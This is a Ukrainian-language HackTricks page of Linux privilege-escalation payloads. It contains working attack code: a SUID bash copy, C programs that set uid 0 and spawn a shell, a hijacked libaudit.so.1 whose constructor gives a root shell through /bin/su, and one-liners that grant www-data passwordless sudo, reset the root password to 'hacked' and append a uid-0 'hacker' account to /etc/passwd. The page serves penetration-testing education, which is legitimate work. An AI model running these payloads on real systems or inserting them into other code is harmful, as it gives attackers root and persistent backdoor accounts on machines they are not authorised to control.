# Payloads для виконання

{{#include ../../banners/hacktricks-training.md}}

## Bash

`bash -p` вмикає privileged mode: коли Bash запускається з різними реальним та ефективним ідентифікаторами, він не скидає ефективний ідентифікатор до реального. Отримана shell усе ще залежить від наявних облікових даних викликувача.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C

`setresuid` змінює реальний, ефективний і збережений ідентифікатори, якщо це дозволено, тоді як `setuid` змінює ефективний ідентифікатор, а також може встановлювати реальний і збережений ідентифікатори для привілейованого caller. `execve` замінює образ поточного процесу на запитану програму.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup> У цих прикладах пропущено перевірки значень, що повертаються; обидва виклики для роботи з обліковими даними можуть завершитися помилкою навіть для UID 0.<sup>[[2]](#references)[[3]](#references)</sup>
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## Перезапис файлу для підвищення привілеїв

### Поширені файли

Це поширені локальні файли та інтерфейси керування привілеями: `/etc/passwd` зберігає записи облікових записів із сімома полями, `/etc/shadow` зберігає додаткові зашифровані дані паролів, `sudoers` визначає привілеї sudo та теги, як-от `NOPASSWD`, а стандартна кінцева точка демона Docker — це Unix-сокет `/var/run/docker.sock`; доступ до цього сокета може надати контроль на рівні root над хостом.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Додати користувача з паролем до _/etc/passwd_
- Змінити пароль у _/etc/shadow_
- Додати користувача до sudoers у _/etc/sudoers_
- Експлуатувати Docker через сокет Docker, зазвичай у _/run/docker.sock_ або _/var/run/docker.sock_

### Перезапис бібліотеки

Перевірте, які спільні бібліотеки використовує бінарний файл; у цьому прикладі перевірте `/bin/su` за допомогою `ldd`.<sup>[[9]](#references)</sup>
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
`ldd` повідомляє про залежності спільних об’єктів, тоді як динамічний компонувальник використовує метадані ELF і правила пошуку для їх завантаження під час виконання.<sup>[[9]](#references)[[10]](#references)</sup>

Щоб перевірити один із кандидатів, використайте `objdump -T`, щоб вивести таблицю динамічних символів `su` і відфільтрувати назви аудиту.<sup>[[11]](#references)</sup>
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
`audit_open`, `audit_log_user_message` і `audit_log_acct_message` є функціями libaudit; `audit_fd` у цьому виводі показано як об’єкт даних, визначений у `.bss` програми `su`.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup> Бібліотека-замінник повинна експортувати сумісні визначення для невизначених символів, які розв’язує loader; невідповідність ABI функцій і даних усе одно може призвести до збою процесу під час переміщення або виклику цих символів.<sup>[[10]](#references)[[11]](#references)</sup>

Атрибут GCC `constructor` спричиняє автоматичний виклик `inject` перед `main` на підтримуваних цільових платформах.<sup>[[15]](#references)</sup>
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
Якщо replacement успішно завантажується привілейованим процесом **`/bin/su`**, цей constructor може запустити **`/bin/bash`** із привілеями цього процесу; точний результат залежить від середовища.<sup>[[10]](#references)[[15]](#references)</sup>

## Скрипти

Чи можете ви змусити root виконати щось?

`sudoers` використовує тег `NOPASSWD` у записах політик, `chpasswd` читає пари `user:password` зі стандартного вводу, а `/etc/passwd` використовує сім полів облікового запису, розділених двокрапками; наведені нижче приклади передбачають, що відповідні файли доступні для запису процесу, який їх запускає.<sup>[[5]](#references)[[6]](#references)[[16]](#references)</sup>

### **www-data до sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **Змінити пароль root**
```bash
echo "root:hacked" | chpasswd
```
### Додати нового root-користувача до /etc/passwd

Фінальний payload залежить від target, який приймає згенерований `crypt` hash: Debian `mkpasswd -m sha-512` відповідає SHA-512 crypt (`$6$`), тоді як OpenSSL `passwd -1 -salt` використовує BSD-алгоритм на основі MD5 (`$1$`).<sup>[[17]](#references)[[18]](#references)</sup>
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
## References

- [1] [Вбудована команда set (довідковий посібник Bash)](https://www.gnu.org/s/bash/manual/html_node/The-Set-Builtin.html)
- [2] [setresuid(2) — сторінка посібника Linux](https://man7.org/linux/man-pages/man2/setresuid.2.html)
- [3] [setuid(2) — сторінка посібника Linux](https://man7.org/linux/man-pages/man2/setuid.2.html)
- [4] [execve(2) — сторінка посібника Linux](https://man7.org/linux/man-pages/man2/execve.2.html)
- [5] [passwd(5) — сторінка посібника Linux](https://man7.org/linux/man-pages/man5/passwd.5.html)
- [6] [sudoers(5) — сторінки посібників Debian](https://manpages.debian.org/testing/sudo/sudoers.5.en.html)
- [7] [Захист сокета Docker daemon](https://docs.docker.com/engine/security/protect-access/)
- [8] [dockerd — документація Docker](https://docs.docker.com/reference/cli/dockerd/)
- [9] [ldd(1) — сторінка посібника Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [10] [ld.so(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [11] [objdump (бінарні утиліти GNU)](https://sourceware.org/binutils/docs/binutils/objdump.html)
- [12] [audit_open(3) — сторінки посібників Debian](https://manpages.debian.org/trixie/libaudit-dev/audit_open.3.en.html)
- [13] [audit_log_user_message(3) — сторінки посібників Debian](https://manpages.debian.org/testing/libaudit-dev/audit_log_user_message.3.en.html)
- [14] [audit_log_acct_message(3) — сторінки посібників Debian](https://manpages.debian.org/testing/libaudit-dev/audit_log_acct_message.3.en.html)
- [15] [Загальні атрибути (використання GNU Compiler Collection)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [16] [chpasswd(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/chpasswd.8.html)
- [17] [mkpasswd.c — вихідний код Debian](https://sources.debian.org/src/whois/5.5.17/mkpasswd.c)
- [18] [openssl-passwd — документація OpenSSL](https://docs.openssl.org/master/man1/openssl-passwd/)
{{#include ../../banners/hacktricks-training.md}}
